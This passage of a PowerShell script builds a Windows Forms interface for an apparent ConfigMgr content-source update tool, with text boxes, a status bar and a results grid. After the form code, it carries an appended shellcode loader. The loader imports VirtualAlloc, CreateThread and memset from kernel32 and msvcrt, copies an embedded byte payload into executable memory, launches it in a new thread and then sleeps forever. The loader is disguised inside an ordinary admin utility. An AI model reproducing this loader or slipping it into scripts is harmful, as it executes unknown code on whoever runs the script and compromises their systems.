        if (($TextBoxMatch.Text.Length -ge 2) -and ($TextBoxReplace.Text.Length -ge 2)) {
            $ButtonValidate.Enabled = $true
        }
        else {
            $ButtonValidate.Enabled = $false
        }
    })
    $TextBoxReplace = New-Object System.Windows.Forms.TextBox
    $TextBoxReplace.Location = New-Object System.Drawing.Size(20,88) 
    $TextBoxReplace.Size = New-Object System.Drawing.Size(480,20)
    $TextBoxReplace.TabIndex = "1"
    $TextBoxReplace.Anchor = "Top, Left, Right"
    $TextBoxReplace.Add_TextChanged({
        if (($TextBoxMatch.Text.Length -ge 2) -and ($TextBoxReplace.Text.Length -ge 2)) {
            $ButtonValidate.Enabled = $true
        }
        else {
            $ButtonValidate.Enabled = $false
        }
    })

    
    $OutputBox = New-Object System.Windows.Forms.RichTextBox
    $OutputBox.Location = New-Object System.Drawing.Size(20,475)
    $OutputBox.Size = New-Object System.Drawing.Size(838,145)
    $OutputBox.Anchor = "Bottom, Left, Right"
    $OutputBox.Font = "Courier New"
    $OutputBox.BackColor = "white"
    $OutputBox.ReadOnly = $true
    $OutputBox.MultiLine = $true

    
    $StatusBarPanelActivity = New-Object Windows.Forms.StatusBarPanel
    $StatusBarPanelActivity.Text = "Ready"
    $StatusBarPanelActivity.Width = "100"
    $StatusBarPanelProcessing = New-Object Windows.Forms.StatusBarPanel
    $StatusBarPanelProcessing.Text = ""
    $StatusBarPanelProcessing.AutoSize = "Spring"
    $StatusBar = New-Object Windows.Forms.StatusBar
    $StatusBar.Size = New-Object System.Drawing.Size(500,20)
    $StatusBar.ShowPanels = $true
    $StatusBar.SizingGrip = $false
    $StatusBar.AutoSize = "Full"
    $StatusBar.Panels.AddRange(@(
        $StatusBarPanelActivity, 
        $StatusBarPanelProcessing
    ))

    
    $DGVResults = New-Object System.Windows.Forms.DataGridView
    $DGVResults.Location = New-Object System.Drawing.Size(20,150)
    $DGVResults.Size = New-Object System.Drawing.Size(838,285)
    $DGVResults.Anchor = "Top, Bottom, Left, Right"
    $DGVResults.ColumnHeadersVisible = $true
    $DGVResults.Columns.Insert(0,(New-Object -TypeName System.Windows.Forms.DataGridViewCheckBoxColumn))
    $DGVResults.Columns[0].Name = "Update"
    $DGVResults.Columns[0].Resizable = [System.Windows.Forms.DataGridViewTriState]::False
    $DGVResults.Columns[0].Width = "50"
    $DGVResults.Columns.Insert(1,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
    $DGVResults.Columns[1].Name = "Application"
    $DGVResults.Columns[1].Width = "200"
    $DGVResults.Columns[1].ReadOnly = $true
    $DGVResults.Columns.Insert(2,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
    $DGVResults.Columns[2].Name = "Deployment Type"
    $DGVResults.Columns[2].AutoSizeMode = "Fill"
    $DGVResults.Columns[2].ReadOnly = $true
    $DGVResults.Columns.Insert(3,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
    $DGVResults.Columns[3].Name = "Existing Content Source"
    $DGVResults.Columns[3].AutoSizeMode = "Fill"
    $DGVResults.Columns[3].ReadOnly = $true
    $DGVResults.Columns.Insert(4,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
    $DGVResults.Columns[4].Name = "Updated Content Source"
    $DGVResults.Columns[4].AutoSizeMode = "Fill"
    $DGVResults.Columns[4].ReadOnly = $true
    $DGVResults.AllowUserToAddRows = $false
    $DGVResults.AllowUserToDeleteRows = $false
    $DGVResults.ReadOnly = $false
    $DGVResults.MultiSelect = $true
    $DGVResults.ColumnHeadersHeightSizeMode = "DisableResizing"
    $DGVResults.RowHeadersWidthSizeMode = "DisableResizing"
    $DGVResults.RowHeadersVisible = $false
    $DGVResults.SelectionMode = "FullRowSelect"

    
    Load-Form
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x0c,0x02,0x66,0x5d,0xd9,0xc8,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x51,0x31,0x6a,0x13,0x83,0xea,0xfc,0x03,0x6a,0x03,0xe0,0x93,0xa1,0xf3,0x66,0x5b,0x5a,0x03,0x07,0xd5,0xbf,0x32,0x07,0x81,0xb4,0x64,0xb7,0xc1,0x99,0x88,0x3c,0x87,0x09,0x1b,0x30,0x00,0x3d,0xac,0xff,0x76,0x70,0x2d,0x53,0x4a,0x13,0xad,0xae,0x9f,0xf3,0x8c,0x60,0xd2,0xf2,0xc9,0x9d,0x1f,0xa6,0x82,0xea,0xb2,0x57,0xa7,0xa7,0x0e,0xd3,0xfb,0x26,0x17,0x00,0x4b,0x48,0x36,0x97,0xc0,0x13,0x98,0x19,0x05,0x28,0x91,0x01,0x4a,0x15,0x6b,0xb9,0xb8,0xe1,0x6a,0x6b,0xf1,0x0a,0xc0,0x52,0x3e,0xf9,0x18,0x92,0xf8,0xe2,0x6e,0xea,0xfb,0x9f,0x68,0x29,0x86,0x7b,0xfc,0xaa,0x20,0x0f,0xa6,0x16,0xd1,0xdc,0x31,0xdc,0xdd,0xa9,0x36,0xba,0xc1,0x2c,0x9a,0xb0,0xfd,0xa5,0x1d,0x17,0x74,0xfd,0x39,0xb3,0xdd,0xa5,0x20,0xe2,0xbb,0x08,0x5c,0xf4,0x64,0xf4,0xf8,0x7e,0x88,0xe1,0x70,0xdd,0xc4,0x9b,0xef,0xaa,0x14,0x0c,0x87,0x3b,0x7a,0xa5,0x33,0xd4,0xce,0x42,0x9a,0x23,0x31,0x79,0xd3,0xf0,0x9e,0xd1,0x47,0x54,0x73,0xbe,0x5d,0x0c,0x0a,0x99,0x5d,0x65,0xbf,0xb6,0xcb,0x85,0x6c,0x6a,0x64,0x53,0x96,0x8c,0x74,0x8b,0xee,0x8c,0x74,0x4b,0x21,0xb8,0x41,0x08,0x7e,0xae,0xa9,0xde,0xe8,0x79,0x23,0x41,0x2e,0x7a,0xe6,0xf7,0x68,0xd6,0x61,0x08,0x76,0xb9,0xf5,0x5b,0x25,0x6a,0xa1,0x08,0x9f,0xe4,0xa6,0xfa,0x31,0xce,0xc7,0xd0,0xdb,0x5a,0x32,0x84,0xb0,0xc9,0x11,0x69,0x60,0x86,0xb8,0x8b,0x94,0x2d,0x3c,0x46,0x21,0x11,0xb7,0x63,0x66,0xe7,0xd5,0x1c,0x88,0xb2,0x84,0x8b,0x97,0x68,0xa2,0x73,0x0f,0x93,0x23,0x74,0xcf,0xfb,0x43,0x74,0x8f,0xfb,0x10,0x1c,0x57,0x58,0xc5,0x39,0x98,0x75,0x79,0x92,0x35,0xff,0x99,0x42,0xd1,0xff,0x45,0x6d,0x21,0x53,0xd0,0x05,0x33,0xc5,0x55,0x37,0xcc,0x3c,0xe0,0x78,0x46,0x72,0x60,0x7f,0xa7,0x4f,0xf2,0x40,0xd2,0xaa,0xa5,0x83,0x43,0xdd,0xdf,0xfb,0x84,0xe2,0xd1,0x31,0x4d,0x33,0x22,0x18,0x81,0x65,0x73,0x64;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
